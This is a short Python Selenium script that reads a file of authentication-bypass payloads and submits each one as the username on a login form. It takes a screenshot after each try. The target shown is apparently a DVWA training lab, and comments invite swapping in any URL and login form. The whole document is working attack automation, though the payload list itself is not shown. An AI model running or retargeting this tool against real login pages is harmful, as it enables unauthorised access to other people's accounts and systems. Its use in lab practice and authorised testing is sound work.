from os.path import exists
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

if __name__ == '__main__':
    file = open('Auth_Bypass.txt', "r")
    lines = file.readlines()
    file.close()
    op = Options()
    op.add_argument("--headless")
    op.add_argument("--disable-gpu")
    #driver = webdriver.Firefox(options=op)   # UnComment for disabled UI  Firefox
    driver = webdriver.Firefox()              # Comment for disabled UI  Firefox
    count = 0

    for line in lines:
        if not exists("pictures"):
            os.mkdir("pictures")
        count = count + 1

        # change with target URL
        driver.get("http://dvwa.esdown.eu/login.php")

        # change the XPATHs according to your authentication form
        driver.find_element(By.XPATH, '/html/body/div/div[2]/form/fieldset/input[1]').send_keys(str(line.strip())) # input user
        driver.find_element(By.XPATH, '/html/body/div/div[2]/form/fieldset/input[2]').send_keys('e') # input password
        driver.find_element(By.XPATH, '/html/body/div/div[2]/form/fieldset/p/input').click() # input btn connect
        driver.save_screenshot('pictures/' + str(count) + ".png")

    print("finish")